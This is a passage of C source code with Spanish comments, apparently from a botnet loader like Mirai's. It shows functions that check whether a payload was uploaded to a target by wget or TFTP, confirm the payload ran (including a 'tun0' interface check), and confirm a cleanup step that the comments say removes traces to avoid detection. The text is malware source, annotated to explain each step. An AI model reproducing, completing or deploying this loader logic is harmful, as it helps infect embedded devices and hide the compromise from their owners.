 * Esta función maneja la transferencia del payload usando wget,
 * que es el método preferido por su confiabilidad y características:
 * - Soporte para múltiples protocolos (HTTP, HTTPS, FTP)
 * - Manejo automático de redirecciones
 * - Reintentos automáticos en caso de fallo
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Offset al token de respuesta o 0 si no se encuentra
 */
int connection_upload_wget(struct connection *conn)
{
    /* Busca el token de confirmación en la respuesta */
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    return offset;
}

/**
 * Implementa el método de carga mediante TFTP
 * 
 * Esta función maneja la transferencia del payload usando TFTP,
 * que es común en dispositivos embebidos. La función incluye:
 * 1. Verificación de permisos
 * 2. Manejo de timeouts
 * 3. Validación de opciones TFTP
 * 
 * Códigos de error:
 * - Retorna offset negativo para indicar errores específicos
 * - Offset positivo indica éxito
 * - 0 indica que aún no hay respuesta completa
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Offset (positivo=éxito, negativo=error, 0=incompleto)
 */
int connection_upload_tftp(struct connection *conn)
{
    /* Busca el token de respuesta en el buffer */
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;

    /* Verifica errores comunes de TFTP */
    if (util_memsearch(conn->rdbuf, offset, "Permission denied", 17) != -1)
        return offset * -1;    /* Error de permisos */

    if (util_memsearch(conn->rdbuf, offset, "timeout", 7) != -1)
        return offset * -1;    /* Timeout en la transferencia */

    if (util_memsearch(conn->rdbuf, offset, "illegal option", 14) != -1)
        return offset * -1;    /* Opción TFTP no soportada */

    return offset;  /* Transferencia exitosa */
}

/**
 * Verifica la ejecución exitosa del payload
 * 
 * Esta función comprueba si el payload se ha ejecutado correctamente
 * en el sistema objetivo. Realiza las siguientes verificaciones:
 * 1. Busca la respuesta de ejecución esperada
 * 2. Verifica si se estableció la interfaz tun0
 * 3. Determina el estado final de la ejecución
 * 
 * Códigos de retorno especiales:
 * - 0: Aún no hay respuesta completa
 * - offset: Ejecución exitosa sin tun0
 * - 255 + offset: Ejecución exitosa con tun0 activo
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Estado de la verificación (0, offset, o 255+offset)
 */
int connection_verify_payload(struct connection *conn)
{
    /* Busca la respuesta de ejecución en el buffer */
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, EXEC_RESPONSE, strlen(EXEC_RESPONSE));

    if (offset == -1)
        return 0;

    /* Verifica si se estableció la interfaz tun0 */
    if (util_memsearch(conn->rdbuf, offset, "listening tun0", 14) == -1)
        return offset;         /* Éxito sin tun0 */
    else
        return 255 + offset;  /* Éxito con tun0 activo */
}

/**
 * Realiza la limpieza final después de la ejecución
 * 
 * Esta función se encarga de la limpieza post-ejecución:
 * 1. Elimina archivos temporales
 * 2. Limpia rastros de la operación
 * 3. Prepara el sistema para finalizar la conexión
 * 
 * Es crucial para mantener el sistema objetivo en un estado
 * limpio y evitar la detección de la operación.
 * 
 * @param conn  Puntero a la estructura de conexión
 * @return      Offset al token de respuesta o 0 si no se encuentra
 */
int connection_consume_cleanup(struct connection *conn)
{
    /* Espera la confirmación de limpieza */
    int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));

    if (offset == -1)
        return 0;
    return offset;
}

/**
 * Verifica si se pueden consumir N bytes del buffer
 * 
 * Esta función de utilidad verifica si hay suficientes bytes
 * disponibles en el buffer desde una posición específica para
 * consumir una cantidad dada de datos. Es crucial para prevenir
 * desbordamientos de buffer y accesos inválidos a memoria.
 * 
 * @param conn    Puntero a la estructura de conexión
 * @param ptr     Puntero a la posición actual en el buffer
 * @param amount  Cantidad de bytes que se quieren consumir
 * @return        TRUE si hay suficientes bytes, FALSE si no
 */
static BOOL can_consume(struct connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;  /* Calcula el fin del buffer */

    /* Verifica que el puntero más la cantidad requerida no exceda el fin del buffer */
    return ptr + amount < end;
}
